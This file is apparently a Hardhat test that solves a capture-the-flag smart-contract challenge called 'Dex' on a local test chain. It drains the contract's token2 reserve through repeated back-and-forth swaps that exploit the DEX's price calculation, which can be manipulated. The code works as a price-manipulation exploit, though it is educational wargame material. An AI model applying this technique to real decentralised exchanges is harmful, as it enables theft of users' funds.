import {expect} from "./utils/chai-setup";
import {ethers, deployments, getNamedAccounts} from 'hardhat';
import { Deployment } from "hardhat-deploy/dist/types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import {setup} from './utils/index';
import type { Dex, SwappableToken } from '../typechain-types';

// Goal: 1. you claim ownership of the contract; 2. you reduce its balance to 0

describe('Dex', () => {
  let deployer: SignerWithAddress;
  let user1: SignerWithAddress;
  let dex: Dex;
  let swappableToken1: SwappableToken;
  let swappableToken2: SwappableToken;

  beforeEach(async () => {
    ({deployer, user1} = await setup());

    await deployments.fixture(['dex', 'swappableToken1', 'swappableToken2']);

    const DexDeployment: Deployment = await deployments.get('Dex');
    dex = await Promise.resolve(ethers.getContractAt('Dex', DexDeployment.address) as Promise<Dex>);

    const SwappableToken1Deployment: Deployment = await deployments.get('SwappableToken1');
    swappableToken1 = await Promise.resolve(ethers.getContractAt('SwappableToken', SwappableToken1Deployment.address) as Promise<SwappableToken>);

    const SwappableToken2Deployment: Deployment = await deployments.get('SwappableToken2');
    swappableToken2 = await Promise.resolve(ethers.getContractAt('SwappableToken', SwappableToken2Deployment.address) as Promise<SwappableToken>);
  });


  it('', async () => {
    // Challenge set-up: contract gets 100 of each token
    await dex.setTokens(swappableToken1.address, swappableToken2.address);
    await swappableToken1["approve(address,address,uint256)"](deployer.address, dex.address, ethers.BigNumber.from('100'));
    await dex.addLiquidity(swappableToken1.address, ethers.BigNumber.from('100'));
    await swappableToken2["approve(address,address,uint256)"](deployer.address, dex.address, ethers.BigNumber.from('100'));
    await dex.addLiquidity(swappableToken2.address, ethers.BigNumber.from('100'));

    // Challenge set-up: user1 gets 10 of each token
    await swappableToken1.transfer(user1.address, ethers.BigNumber.from('10'));
    await swappableToken2.transfer(user1.address, ethers.BigNumber.from('10'));

    expect(await dex.balanceOf(swappableToken1.address, user1.address)).to.equal(ethers.BigNumber.from('10'));
    expect(await dex.balanceOf(swappableToken2.address, user1.address)).to.equal(ethers.BigNumber.from('10'));
    // *************************

    // Unoptimatized brute force method

    //User1 sends 10 of token1 to the dex, which skews the swap rate to 110/100
    swappableToken1.connect(user1).transfer(dex.address, ethers.BigNumber.from('10'));
    //User1 swaps 10 token2 for token1 on the dex
    swappableToken2.connect(user1)["approve(address,uint256)"](dex.address, ethers.BigNumber.from('10'));
    dex.connect(user1).swap(swappableToken2.address, swappableToken1.address, ethers.BigNumber.from('10'));

    let token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    let token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token1 for token2 on the dex
    swappableToken1.connect(user1)["approve(address,uint256)"](dex.address, token1Balance);
    dex.connect(user1).swap(swappableToken1.address, swappableToken2.address, token1Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token2 for token1 on the dex
    swappableToken2.connect(user1)["approve(address,uint256)"](dex.address, token2Balance);
    dex.connect(user1).swap(swappableToken2.address, swappableToken1.address, token2Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token1 for token2 on the dex
    swappableToken1.connect(user1)["approve(address,uint256)"](dex.address, token1Balance);
    dex.connect(user1).swap(swappableToken1.address, swappableToken2.address, token1Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token2 for token1 on the dex
    swappableToken2.connect(user1)["approve(address,uint256)"](dex.address, token2Balance);
    dex.connect(user1).swap(swappableToken2.address, swappableToken1.address, token2Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token1 for token2 on the dex
    swappableToken1.connect(user1)["approve(address,uint256)"](dex.address, token1Balance);
    dex.connect(user1).swap(swappableToken1.address, swappableToken2.address, token1Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token2 for token1 on the dex
    swappableToken2.connect(user1)["approve(address,uint256)"](dex.address, token2Balance);
    dex.connect(user1).swap(swappableToken2.address, swappableToken1.address, token2Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token1 for token2 on the dex
    swappableToken1.connect(user1)["approve(address,uint256)"](dex.address, token1Balance);
    dex.connect(user1).swap(swappableToken1.address, swappableToken2.address, token1Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token2 for token1 on the dex
    swappableToken2.connect(user1)["approve(address,uint256)"](dex.address, token2Balance);
    dex.connect(user1).swap(swappableToken2.address, swappableToken1.address, token2Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token1 for token2 on the dex
    swappableToken1.connect(user1)["approve(address,uint256)"](dex.address, token1Balance);
    dex.connect(user1).swap(swappableToken1.address, swappableToken2.address, token1Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token2 for token1 on the dex
    swappableToken2.connect(user1)["approve(address,uint256)"](dex.address, token2Balance);
    dex.connect(user1).swap(swappableToken2.address, swappableToken1.address, token2Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token1 for token2 on the dex
    swappableToken1.connect(user1)["approve(address,uint256)"](dex.address, token1Balance);
    dex.connect(user1).swap(swappableToken1.address, swappableToken2.address, token1Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);

    // User1 swaps token2 for token1 on the dex
    swappableToken2.connect(user1)["approve(address,uint256)"](dex.address, token2Balance);
    dex.connect(user1).swap(swappableToken2.address, swappableToken1.address, token2Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);
    // console.log(token1Balance.toString());
    // console.log(token2Balance.toString());
    let dexToken1Balance = await dex.balanceOf(swappableToken1.address, dex.address);
    let dexToken2Balance = await dex.balanceOf(swappableToken2.address, dex.address);
    // console.log(dexToken1Balance.toString());
    // console.log(dexToken2Balance.toString());

    // User1 swaps token1 for token2 on the dex
    swappableToken1.connect(user1)["approve(address,uint256)"](dex.address, dexToken1Balance);
    dex.connect(user1).swap(swappableToken1.address, swappableToken2.address, dexToken1Balance);

    token1Balance = await dex.balanceOf(swappableToken1.address, user1.address);
    token2Balance = await dex.balanceOf(swappableToken2.address, user1.address);
    console.log(token1Balance.toString());
    console.log(token2Balance.toString()); // User1 has all of token2
    dexToken1Balance = await dex.balanceOf(swappableToken1.address, dex.address);
    dexToken2Balance = await dex.balanceOf(swappableToken2.address, dex.address);
    console.log(dexToken1Balance.toString());
    console.log(dexToken2Balance.toString()); // Token2 is drained from the dex contract

    
     
  });

});
